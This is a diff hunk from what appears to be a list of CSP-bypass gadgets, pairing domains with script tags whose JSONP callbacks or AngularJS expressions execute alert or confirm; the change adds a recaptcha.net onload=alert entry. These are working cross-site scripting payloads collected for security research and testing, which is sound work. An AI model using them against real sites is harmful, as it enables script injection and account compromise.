@@ -66,6 +66,7 @@ pubads.g.doubleclick.net	<script src="https://pubads.g.doubleclick.net/gampad/ad
 public-api.wordpress.com	<script src="https://public-api.wordpress.com/rest/v1/sites/en.blog.wordpress.com/posts/?number=1&callback=alert"></script>	renniepak
 query.fqtag.com	<script src="https://query.fqtag.com/b?callback=alert(1)"></script>	renniepak
 r.skimresources.com	<script src="https://r.skimresources.com/api/?callback=alert"></script>	renniepak
+recaptcha.net	<script src="https://recaptcha.net/recaptcha/api.js?onload=alert"></script>	
 s.fqtag.com	<script src="https://s.fqtag.com/b?callback=alert(1)"></script>	renniepak
 s.ytimg.com	<body ng-app ng-csp><script src="https://s.ytimg.com/yts/jslib/angular.min-vfl8oYsy-.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>	
 search.yahoo.com	<script src="https://search.yahoo.com/sugg/gossip/gossip-us-ura/?f=1&.crumb=wYtclSpdh3r&output=sd1&command=&pq=&l=1&bm=3&appid=exp-ats1.l7.search.vip.ir2.yahoo.com&t_stmp=1571806738592&nresults=10&bck=1he6d8leq7ddu%26b%3D3%26s%3Dcb&csrcpvid=8wNpljk4LjEYuM1FXaO1vgNfMTk1LgAAAAA5E2a9&vtestid=&mtestid=&spaceId=1197804867&callback=confirm"></script>	
